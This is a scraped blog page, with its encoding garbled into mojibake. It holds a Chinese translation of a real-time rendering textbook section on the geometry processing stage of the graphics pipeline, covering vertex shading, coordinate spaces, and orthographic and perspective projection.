itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€Šå®æ—¶æ¸²æŸ“ã€‹ç¬¬2ç« -å›¾å½¢æ¸²æŸ“ç®¡çº¿-2.3å‡ ä½•å¤„ç†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1117549770846872/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    charlee44
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T12:42:16.000Z" title="Wed Jan 21 2026 12:42:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å®æ—¶æ¸²æŸ“</h2>
<h3 data-id="heading-1">2. å›¾å½¢æ¸²æŸ“ç®¡çº¿</h3>
<h4 data-id="heading-2">2.3 å‡ ä½•å¤„ç†</h4>
<p>GPUä¸Šçš„å‡ ä½•å¤„ç†é˜¶æ®µè´Ÿè´£å¤§å¤šæ•°æ¯ä¸ªä¸‰è§’å½¢å’Œæ¯ä¸ªé¡¶ç‚¹çš„æ“ä½œã€‚è¯¥é˜¶æ®µè¿›ä¸€æ­¥åˆ†ä¸ºä»¥ä¸‹åŠŸèƒ½é˜¶æ®µï¼šé¡¶ç‚¹ç€è‰²ã€æŠ•å½±ã€è£å‰ªå’Œå±å¹•æ˜ å°„ï¼ˆå¦‚å›¾2.3ï¼‰ã€‚</p>
<div align="center">
<p><img src="https://p0-xtjj-private.juejin.cn/tos-cn-i-73owjymdk6/7612d48e2f9c4783bf8e5ec63aaf758b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY2hhcmxlZTQ0:q75.awebp?policy=eyJ2bSI6MywidWlkIjoiMTExNzU0OTc3MDg0Njg3MiJ9&amp;rk3s=e9ecf3d6&amp;x-orig-authkey=f32326d3454f2ac7e96d3d06cdbb035152127018&amp;x-orig-expires=1769085679&amp;x-orig-sign=6Lcc%2Fc3L%2FGGdHSMzf85J0QGC%2Bts%3D" alt="" loading="lazy"/></p>
</div>
<div align="center">
<p>å›¾2.3. å‡ ä½•å¤„ç†é˜¶æ®µåˆ†ä¸ºä¸€ç³»åˆ—åŠŸèƒ½é˜¶æ®µ</p>
</div>
<h5 data-id="heading-3">2.3.1 é¡¶ç‚¹ç€è‰²</h5>
<p>é¡¶ç‚¹ç€è‰²æœ‰ä¸¤ä¸ªä¸»è¦ä»»åŠ¡ï¼Œå³è®¡ç®—é¡¶ç‚¹çš„ä½ç½®å’Œè¯„ä¼°ç¨‹åºå‘˜å¯èƒ½å–œæ¬¢çš„é¡¶ç‚¹è¾“å‡ºæ•°æ®ï¼Œä¾‹å¦‚æ³•çº¿åæ ‡å’Œçº¹ç†åæ ‡ã€‚ä¼ ç»Ÿä¸Šï¼Œå¯¹è±¡çš„å¤§éƒ¨åˆ†é˜´å½±æ˜¯é€šè¿‡å°†ç¯å…‰åº”ç”¨åˆ°æ¯ä¸ªé¡¶ç‚¹çš„ä½ç½®å’Œæ³•çº¿å¹¶ä»…å°†ç»“æœé¢œè‰²å­˜å‚¨åœ¨é¡¶ç‚¹æ¥è®¡ç®—çš„ã€‚ç„¶åå°†è¿™äº›é¢œè‰²æ’å…¥æ•´ä¸ªä¸‰è§’å½¢ã€‚å‡ºäºè¿™ä¸ªåŸå› ï¼Œè¿™ä¸ªå¯ç¼–ç¨‹çš„é¡¶ç‚¹å¤„ç†å•å…ƒè¢«å‘½åä¸ºé¡¶ç‚¹ç€è‰²å™¨[1049]ã€‚éšç€ç°ä»£GPUçš„å‡ºç°ï¼Œä»¥åŠæ¯ä¸ªåƒç´ å‘ç”Ÿçš„éƒ¨åˆ†æˆ–å…¨éƒ¨ç€è‰²ï¼Œè¿™ä¸ªé¡¶ç‚¹ç€è‰²é˜¶æ®µæ›´åŠ é€šç”¨ï¼Œå¹¶ä¸”å¯èƒ½æ ¹æœ¬ä¸ä¼šæ±‚å–ä»»ä½•ç€è‰²æ–¹ç¨‹çš„å€¼ï¼Œå…¶å·¥ä½œä¸»è¦å–å†³äºç¨‹åºå‘˜çš„æ„å›¾ã€‚é¡¶ç‚¹ç€è‰²å™¨ç°åœ¨æ˜¯ä¸€ä¸ªæ›´é€šç”¨çš„å•å…ƒï¼Œä¸“é—¨ç”¨äºè®¾ç½®ä¸æ¯ä¸ªé¡¶ç‚¹å…³è”çš„æ•°æ®ã€‚ä¾‹å¦‚ï¼Œé¡¶ç‚¹ç€è‰²å™¨å¯ä»¥ä½¿ç”¨<a href="https://link.juejin.cn?target=%25E7%25AC%25AC4.4%25E8%258A%2582" target="_blank" title="%E7%AC%AC4.4%E8%8A%82" ref="nofollow noopener noreferrer">ç¬¬4.4èŠ‚</a>å’Œ<a href="https://link.juejin.cn?target=%25E7%25AC%25AC4.5%25E8%258A%2582" target="_blank" title="%E7%AC%AC4.5%E8%8A%82" ref="nofollow noopener noreferrer">ç¬¬4.5èŠ‚</a>ä¸­çš„æ–¹æ³•ä¸ºå¯¹è±¡è®¾ç½®åŠ¨ç”»ã€‚</p>
<p>æˆ‘ä»¬é¦–å…ˆæè¿°å¦‚ä½•è®¡ç®—é¡¶ç‚¹ä½ç½®ï¼Œä¸€ç»„å§‹ç»ˆéœ€è¦çš„åæ ‡ã€‚åœ¨è¢«å±å¹•æ˜¾ç¤ºçš„è¿‡ç¨‹ä¸­ï¼Œæ¨¡å‹è¢«è½¬æ¢æˆå‡ ä¸ªä¸åŒçš„ç©ºé—´æˆ–åæ ‡ç³»ã€‚æœ€åˆï¼Œæ¨¡å‹é©»ç•™åœ¨è‡ªå·±çš„æ¨¡å‹ç©ºé—´ä¸­ï¼Œè¿™ä»…æ„å‘³ç€å®ƒæ ¹æœ¬æ²¡æœ‰è¢«è½¬æ¢ã€‚æ¯ä¸ªæ¨¡å‹éƒ½å¯ä»¥ä¸æ¨¡å‹å˜æ¢ç›¸å…³è”ï¼Œä»¥ä¾¿å¯ä»¥å¯¹å…¶è¿›è¡Œå®šä½å’Œå®šå‘ã€‚å¯ä»¥å°†å¤šä¸ªæ¨¡å‹è½¬æ¢ä¸å•ä¸ªæ¨¡å‹ç›¸å…³è”ã€‚è¿™å…è®¸åŒä¸€æ¨¡å‹çš„å¤šä¸ªå‰¯æœ¬ï¼ˆç§°ä¸ºå®ä¾‹ï¼‰åœ¨åŒä¸€åœºæ™¯ä¸­å…·æœ‰ä¸åŒçš„ä½ç½®ã€æ–¹å‘å’Œå¤§å°ï¼Œè€Œæ— éœ€å¤åˆ¶åŸºæœ¬å‡ ä½•ä½“ã€‚</p>
<p>æ¨¡å‹å˜æ¢æ‰€å˜æ¢çš„æ˜¯æ¨¡å‹çš„é¡¶ç‚¹å’Œæ³•çº¿ã€‚å¯¹è±¡çš„åæ ‡ç§°ä¸ºæ¨¡å‹åæ ‡ï¼Œåœ¨å¯¹è¿™äº›åæ ‡åº”ç”¨æ¨¡å‹å˜æ¢åï¼Œæ¨¡å‹è¢«ç§°ä¸ºä½äºä¸–ç•Œåæ ‡æˆ–ä¸–ç•Œç©ºé—´ä¸­ã€‚ä¸–ç•Œç©ºé—´æ˜¯å”¯ä¸€çš„ï¼Œæ¨¡å‹ç»è¿‡å„è‡ªçš„æ¨¡å‹å˜æ¢åï¼Œæ‰€æœ‰çš„æ¨¡å‹éƒ½å­˜åœ¨äºåŒä¸€ä¸ªç©ºé—´ä¸­ã€‚</p>
<p>å¦‚å‰æ‰€è¿°ï¼Œæ¨¡å‹åªæœ‰è¢«ç›¸æœºï¼ˆæˆ–è§‚å¯Ÿè€…ï¼‰çœ‹åˆ°æ‰èƒ½æ¸²æŸ“ã€‚ç›¸æœºåœ¨ä¸–ç•Œç©ºé—´ä¸­æœ‰ä¸€ä¸ªä½ç½®å’Œä¸€ä¸ªæ–¹å‘ï¼Œç”¨äºæ”¾ç½®å’Œç„å‡†ç›¸æœºã€‚ä¸ºäº†ä¾¿äºæŠ•å½±å’Œå‰ªè¾‘ï¼Œç›¸æœºå’Œæ‰€æœ‰æ¨¡å‹éƒ½ä½¿ç”¨è§†å›¾å˜æ¢è¿›è¡Œäº†å˜æ¢ã€‚è§†å›¾å˜æ¢çš„ç›®çš„æ˜¯å°†ç›¸æœºæ”¾ç½®åœ¨åŸç‚¹å¹¶ç„å‡†å®ƒï¼Œä½¿å…¶çœ‹å‘è´Ÿzè½´çš„æ–¹å‘ï¼Œyè½´æŒ‡å‘ä¸Šæ–¹ï¼Œxè½´æŒ‡å‘å³ä¾§ã€‚æˆ‘ä»¬ä½¿ç”¨-zè½´çº¦å®šï¼›ä¸€äº›æ–‡ç« ä¹Ÿä¼šä½¿ç”¨å‘ä¸‹çœ‹+zè½´çš„çº¦å®šã€‚åŒºåˆ«ä¸»è¦æ˜¯è¯­ä¹‰ä¸Šçš„ï¼Œå› ä¸ºä¸€ä¸ªå’Œå¦ä¸€ä¸ªä¹‹é—´çš„è½¬æ¢å¾ˆç®€å•ã€‚åº”ç”¨è§†å›¾å˜æ¢åçš„å®é™…ä½ç½®å’Œæ–¹å‘å–å†³äºåº•å±‚åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£ (API)ã€‚å¦‚æ­¤åˆ’å®šçš„ç©ºé—´ç§°ä¸ºç›¸æœºç©ºé—´ï¼Œæˆ–æ›´å¸¸è§çš„æ˜¯ï¼Œè§†å›¾ç©ºé—´æˆ–çœ¼ç›ç©ºé—´ã€‚è§†å›¾å˜æ¢å½±å“ç›¸æœºå’Œæ¨¡å‹çš„æ–¹å¼ç¤ºä¾‹å¦‚å›¾2.4æ‰€ç¤ºã€‚æ¨¡å‹å˜æ¢å’Œè§†å›¾å˜æ¢éƒ½å¯ä»¥ç”¨4Ã—4çŸ©é˜µæ¥å®ç°ï¼Œè¿™æ˜¯<a href="https://link.juejin.cn?target=%25E7%25AC%25AC4%25E7%25AB%25A0" target="_blank" title="%E7%AC%AC4%E7%AB%A0" ref="nofollow noopener noreferrer">ç¬¬4ç« </a>çš„ä¸»é¢˜ã€‚ä½†æ˜¯ï¼Œé‡è¦çš„æ˜¯è¦æ„è¯†åˆ°å¯ä»¥ä»¥ç¨‹åºå‘˜å–œæ¬¢çš„ä»»ä½•æ–¹å¼è®¡ç®—é¡¶ç‚¹çš„ä½ç½®å’Œæ³•çº¿ã€‚</p>
<div align="center">
<p><img src="https://p0-xtjj-private.juejin.cn/tos-cn-i-73owjymdk6/8d94ab1c1ab2456c9933558b2c01ef4a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY2hhcmxlZTQ0:q75.awebp?policy=eyJ2bSI6MywidWlkIjoiMTExNzU0OTc3MDg0Njg3MiJ9&amp;rk3s=e9ecf3d6&amp;x-orig-authkey=f32326d3454f2ac7e96d3d06cdbb035152127018&amp;x-orig-expires=1769085679&amp;x-orig-sign=DEAeJkKZm7YuJkhu8YJ%2FSHYt1Mc%3D" alt="" loading="lazy"/></p>
</div>
<div align="center">
<p>å›¾2.4 åœ¨å·¦å›¾ä¸­ï¼Œè‡ªä¸Šè€Œä¸‹çš„è§†å›¾æ˜¾ç¤ºäº†åœ¨+zè½´å‘ä¸Šçš„åæ ‡ç³»ä¸­ï¼ŒæŒ‰ç…§ç”¨æˆ·å¸Œæœ›çš„æ–¹å¼å®šä½å’Œå®šå‘çš„ç›¸æœºã€‚è§†å›¾å˜æ¢é‡æ–°å®šå‘äº†åæ ‡ç³»ï¼Œä½¿ç›¸æœºä½äºåŸç‚¹ï¼Œæ²¿å…¶è´Ÿzè½´çœ‹ï¼Œç›¸æœºçš„+yè½´å‘ä¸Šï¼Œå¦‚å³å›¾æ‰€ç¤ºã€‚è¿™æ ·åšæ˜¯ä¸ºäº†ä½¿è£å‰ªå’ŒæŠ•å½±æ“ä½œæ›´ç®€å•ã€æ›´å¿«æ·ã€‚æµ…è“è‰²åŒºåŸŸæ˜¯è§†é”¥ä½“ã€‚åœ¨è¿™é‡Œï¼Œå‡è®¾é€è§†å›¾ï¼Œå› ä¸ºè§†é”¥ä½“æ˜¯ä¸€ä¸ªå¹³æˆªå¤´ä½“ã€‚ç±»ä¼¼çš„æŠ€æœ¯é€‚ç”¨äºä»»ä½•ç±»å‹çš„æŠ•å½±ã€‚</p>
</div>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†æè¿°é¡¶ç‚¹ç€è‰²çš„ç¬¬äºŒç§ç±»å‹çš„è¾“å‡ºã€‚è¦ç”Ÿæˆé€¼çœŸçš„åœºæ™¯ï¼Œä»…æ¸²æŸ“å¯¹è±¡çš„å½¢çŠ¶å’Œä½ç½®æ˜¯ä¸å¤Ÿçš„ï¼Œè¿˜å¿…é¡»å¯¹å®ƒä»¬çš„å¤–è§‚è¿›è¡Œå»ºæ¨¡ã€‚è¯¥æè¿°åŒ…æ‹¬æ¯ä¸ªç‰©ä½“çš„æè´¨ï¼Œä»¥åŠä»»ä½•å…‰æºç…§å°„åœ¨ç‰©ä½“ä¸Šçš„æ•ˆæœã€‚ææ–™å’Œç¯å…‰å¯ä»¥é€šè¿‡å¤šç§æ–¹å¼å»ºæ¨¡ï¼Œä»ç®€å•çš„é¢œè‰²åˆ°ç‰©ç†æè¿°çš„ç²¾ç»†è¡¨ç¤ºã€‚</p>
<p>è¿™ç§ç¡®å®šå…‰å¯¹ææ–™æ•ˆæœçš„æ“ä½œç§°ä¸ºç€è‰²ã€‚å®ƒæ¶‰åŠè®¡ç®—å¯¹è±¡ä¸Šä¸åŒç‚¹çš„ç€è‰²æ–¹ç¨‹ã€‚é€šå¸¸ï¼Œå…¶ä¸­ä¸€äº›è®¡ç®—åœ¨æ¨¡å‹é¡¶ç‚¹çš„å‡ ä½•å¤„ç†æœŸé—´æ‰§è¡Œï¼Œè€Œå…¶ä»–è®¡ç®—å¯èƒ½åœ¨é€åƒç´ å¤„ç†æœŸé—´æ‰§è¡Œã€‚å„ç§æè´¨æ•°æ®å¯ä»¥å­˜å‚¨åœ¨æ¯ä¸ªé¡¶ç‚¹ï¼Œä¾‹å¦‚ç‚¹çš„ä½ç½®ã€æ³•çº¿ã€é¢œè‰²æˆ–æ±‚å–ç€è‰²æ–¹ç¨‹å€¼æ‰€éœ€çš„ä»»ä½•å…¶ä»–æ•°å­—ä¿¡æ¯ã€‚ç„¶åï¼Œé¡¶ç‚¹ç€è‰²ç»“æœï¼ˆå¯ä»¥æ˜¯é¢œè‰²ã€çŸ¢é‡ã€çº¹ç†åæ ‡ä»¥åŠä»»ä½•å…¶ä»–ç±»å‹çš„ç€è‰²æ•°æ®ï¼‰è¢«å‘é€åˆ°å…‰æ …åŒ–å’Œåƒç´ å¤„ç†é˜¶æ®µè¿›è¡Œæ’å€¼å¹¶ç”¨äºè®¡ç®—è¡¨é¢çš„ç€è‰²ã€‚</p>
<p>GPUé¡¶ç‚¹ç€è‰²å™¨å½¢å¼çš„é¡¶ç‚¹ç€è‰²åœ¨æœ¬ä¹¦ä¸­è¿›è¡Œäº†æ›´æ·±å…¥çš„è®¨è®ºï¼Œå°¤å…¶æ˜¯åœ¨<a href="https://link.juejin.cn?target=%25E7%25AC%25AC3%25E7%25AB%25A0" target="_blank" title="%E7%AC%AC3%E7%AB%A0" ref="nofollow noopener noreferrer">ç¬¬3ç« </a>å’Œ<a href="https://link.juejin.cn?target=%25E7%25AC%25AC5%25E7%25AB%25A0" target="_blank" title="%E7%AC%AC5%E7%AB%A0" ref="nofollow noopener noreferrer">ç¬¬5ç« </a>ä¸­ã€‚</p>
<p>ä½œä¸ºé¡¶ç‚¹ç€è‰²çš„ä¸€éƒ¨åˆ†ï¼Œæ¸²æŸ“ç³»ç»Ÿå…ˆè¿›è¡ŒæŠ•å½±ï¼Œç„¶åè¿›è¡Œè£å‰ªï¼Œå°†è§†å›¾ä½“æ¢ä¸ºå•ä½ç«‹æ–¹ä½“ï¼Œå…¶æå€¼ç‚¹ä½äº<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo>âˆ’</mo><mn>1</mn><mo separator="true">,</mo><mo>âˆ’</mo><mn>1</mn><mo separator="true">,</mo><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(-1,-1,-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord">âˆ’</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">âˆ’</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">âˆ’</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></span> å’Œ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>1</mn><mo separator="true">,</mo><mn>1</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(1,1,1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">1</span><span class="mclose">)</span></span></span></span></span>ä¹‹é—´ã€‚å¯ä»¥ä½¿ç”¨ä¸åŒçš„èŒƒå›´æ¥å®šä¹‰ç›¸åŒçš„ä½“ç§¯ï¼Œä¾‹å¦‚ï¼Œ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>0</mn><mo>â‰¤</mo><mi>z</mi><mo>â‰¤</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(0 â‰¤ z â‰¤ 1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"/><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">1</span><span class="mclose">)</span></span></span></span></span>ã€‚å•ä½ç«‹æ–¹ä½“ç§°ä¸ºæ­£è§„åŒ–è§†å›¾ä½“ã€‚æŠ•å½±æ˜¯åœ¨GPUä¸Šç”±é¡¶ç‚¹ç€è‰²å™¨é¦–å…ˆå®Œæˆçš„ã€‚å¸¸ç”¨çš„æŠ•å½±æ–¹æ³•æœ‰ä¸¤ç§ï¼Œå³æ­£å°„æŠ•å½±ï¼ˆä¹Ÿç§°å¹³è¡ŒæŠ•å½±ï¼‰å’Œé€è§†æŠ•å½±ï¼Œå¦‚å›¾2.5ã€‚äº‹å®ä¸Šï¼Œæ­£å°„æŠ•å½±åªæ˜¯ä¸€ç§å¹³è¡ŒæŠ•å½±ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–å‡ ç§æŠ•å½±æ–¹å¼ï¼ˆç‰¹åˆ«æ˜¯åœ¨å»ºç­‘é¢†åŸŸï¼‰ï¼Œä¾‹å¦‚æ–œæŠ•å½±å’Œè½´æµ‹æŠ•å½±ã€‚è€å¼è¡—æœºæ¸¸æˆZaxxonå°±æ˜¯ä»¥åè€…å‘½åçš„ã€‚</p>
<div align="center">
<p><img src="https://p0-xtjj-private.juejin.cn/tos-cn-i-73owjymdk6/6a2460500079400594fa99a4db100add~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY2hhcmxlZTQ0:q75.awebp?policy=eyJ2bSI6MywidWlkIjoiMTExNzU0OTc3MDg0Njg3MiJ9&amp;rk3s=e9ecf3d6&amp;x-orig-authkey=f32326d3454f2ac7e96d3d06cdbb035152127018&amp;x-orig-expires=1769085679&amp;x-orig-sign=rWwAdKUBicG1VawdZv1nwJXjX4c%3D" alt="" loading="lazy"/></p>
</div>
<div align="center">
<p>å›¾2.5. å·¦ä¾§æ˜¯æ­£å°„æŠ•å½±æˆ–å¹³è¡ŒæŠ•å½±ï¼›å³è¾¹æ˜¯é€è§†æŠ•å½±ã€‚</p>
</div>
<p>è¯·æ³¨æ„ï¼ŒæŠ•å½±è¡¨ç¤ºä¸ºçŸ©é˜µï¼ˆ<a href="https://link.juejin.cn?target=%25E7%25AC%25AC4.7%25E8%258A%2582" target="_blank" title="%E7%AC%AC4.7%E8%8A%82" ref="nofollow noopener noreferrer">ç¬¬4.7èŠ‚</a>ï¼‰ï¼Œå› æ­¤å®ƒæœ‰æ—¶å¯èƒ½ä¸å‡ ä½•å˜æ¢çš„å…¶ä½™éƒ¨åˆ†è¿æ¥ã€‚</p>
<p>æ­£äº¤è§‚å¯Ÿçš„è§†å›¾ä½“é€šå¸¸æ˜¯ä¸€ä¸ªçŸ©å½¢æ¡†ï¼Œæ­£äº¤æŠ•å½±å°†è¿™ä¸ªè§†å›¾ä½“å˜æ¢ä¸ºå•ä½ç«‹æ–¹ä½“ã€‚æ­£äº¤æŠ•å½±çš„ä¸»è¦ç‰¹ç‚¹æ˜¯å¹³è¡Œçº¿åœ¨å˜æ¢åä¿æŒå¹³è¡Œã€‚è¿™ç§è½¬æ¢æ˜¯å¹³ç§»å’Œç¼©æ”¾çš„ç»„åˆã€‚</p>
<p>é€è§†æŠ•å½±æœ‰ç‚¹å¤æ‚ã€‚åœ¨è¿™ç§ç±»å‹çš„æŠ•å½±ä¸­ï¼Œç‰©ä½“ç¦»ç›¸æœºè¶Šè¿œï¼ŒæŠ•å½±åçœ‹èµ·æ¥è¶Šå°ã€‚å¦å¤–ï¼Œå¹³è¡Œçº¿å¯èƒ½ä¼šèšåœ¨åœ°å¹³çº¿ä¸Šã€‚å› æ­¤ï¼Œé€è§†å˜æ¢æ¨¡ä»¿äº†æˆ‘ä»¬æ„ŸçŸ¥ç‰©ä½“å¤§å°çš„æ–¹å¼ã€‚åœ¨å‡ ä½•ä¸Šï¼Œç§°ä¸ºæˆªå¤´é”¥ä½“çš„è§†å›¾ä½“æ˜¯ä¸€ä¸ªå…·æœ‰çŸ©å½¢åº•é¢çš„æˆªæ£±é”¥ã€‚æˆªå¤´é”¥ä½“ä¹Ÿè½¬åŒ–ä¸ºå•ä½ç«‹æ–¹ä½“ã€‚æ­£äº¤å˜æ¢å’Œé€è§†å˜æ¢éƒ½å¯ä»¥ç”¨4Ã—4çŸ©é˜µæ„é€ ï¼ˆ<a href="https://link.juejin.cn?target=%25E7%25AC%25AC4%25E7%25AB%25A0" target="_blank" title="%E7%AC%AC4%E7%AB%A0" ref="nofollow noopener noreferrer">ç¬¬4ç« </a>ï¼‰ï¼Œå¹¶ä¸”åœ¨ä»»ä¸€å˜æ¢ä¹‹åï¼Œæ¨¡å‹éƒ½è¢«ç§°ä¸ºåœ¨è£å‰ªåæ ‡ä¸­ã€‚è¿™äº›å®é™…ä¸Šæ˜¯é½æ¬¡åæ ‡ï¼Œåœ¨<a href="https://link.juejin.cn?target=%25E7%25AC%25AC4%25E7%25AB%25A0" target="_blank" title="%E7%AC%AC4%E7%AB%A0" ref="nofollow noopener noreferrer">ç¬¬4ç« </a>ä¸­è®¨è®ºè¿‡ï¼Œå› æ­¤è¿™å‘ç”Ÿåœ¨é™¤ä»¥wä¹‹å‰ã€‚GPUçš„é¡¶ç‚¹ç€è‰²å™¨å¿…é¡»å§‹ç»ˆè¾“å‡ºè¿™ç§ç±»å‹çš„åæ ‡ï¼Œä»¥ä¾¿ä¸‹ä¸€ä¸ªåŠŸèƒ½é˜¶æ®µï¼ˆè£å‰ªï¼‰æ­£å¸¸å·¥ä½œã€‚</p>
